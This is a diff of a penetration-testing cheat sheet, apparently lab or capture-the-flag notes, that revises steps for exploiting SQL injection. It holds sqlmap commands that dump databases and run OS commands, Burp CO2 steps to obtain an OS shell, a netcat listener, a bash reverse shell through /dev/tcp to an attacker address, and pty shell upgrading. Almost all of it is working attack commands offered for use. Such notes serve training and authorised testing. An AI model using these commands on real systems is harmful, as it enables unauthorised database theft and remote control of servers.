@@ -298,30 +298,34 @@ admin’;--
 - Burp
 Extender > BAppStore > CO2 > Install
 Proxy > Intercept > turn on intercept.
-Send a form request with no data using the browser.
+Send a form request with 'tset' using the browser.
 Right-click on the captured request > Extension > CO2 > Send to SQLMapper
 CO2 > Config > SQLMap Path: /usr/bin/sqlmap > OK
 Extra SQLMapper Params: --os-shell
-Run
+Because the output screen will be so small, copy the string and paste into a Terminal.
+sqlmap -u 'http://target IP:80/dashboard.php?search=test' --cookie='PHPSESSID=<cookie>' --os-shell
 
-- If you get a shell
+- If you get a shell, open a new tab in Terminal.
 nc -lvnp 443
 
-os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.5/443 0>&1"
+- Use sqlmap to make the shell more stable.
+os-shell> bash -c "bash -i >& /dev/tcp/attacker IP/443 0>&1"
 
-python3 -V
-python3 -c 'import pty;pty.spawn("bash")'
-ctrl Z
-stty raw -echo; fg
+- Use Terminal to quickly make the shell fully interactive.
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo
+fg
+export TERM=xterm
 cd ~
 
 - Burp 2
 Save the captured request to a file called tmp.
 
-sqlmap.py -r tmp --force-ssl --batch --dbs --dump
-sqlmap.py -r tmp --force-ssl --batch -D <database> --tables
-sqlmap.py -r tmp --force-ssl --batch -D <database> -T <table> --dump
-sqlmap.py -r tmp --force-ssl --batch --os-cmd whoami
-sqlmap.py -r tmp --force-ssl --batch --os-cmd id
-sqlmap.py -r tmp --force-ssl --batch --os-shell
+sqlmap -r tmp --force-ssl --batch --dbs --dump
+sqlmap -r tmp --force-ssl --batch -D <database> --tables
+sqlmap -r tmp --force-ssl --batch -D <database> -T <table> --dump
+sqlmap -r tmp --force-ssl --batch --os-cmd id
+sqlmap -r tmp --force-ssl --batch --os-cmd whoami
+sqlmap -r tmp --force-ssl --batch --os-shell
 
